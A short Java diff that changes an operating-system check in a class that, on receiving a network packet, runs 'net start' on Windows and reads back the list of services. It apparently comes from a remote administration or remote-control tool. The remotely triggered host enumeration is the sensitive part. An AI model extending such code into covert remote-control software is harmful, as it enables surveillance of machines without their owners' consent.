@@ -14,7 +14,7 @@ public class Packet77ListServices extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec("net start");
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
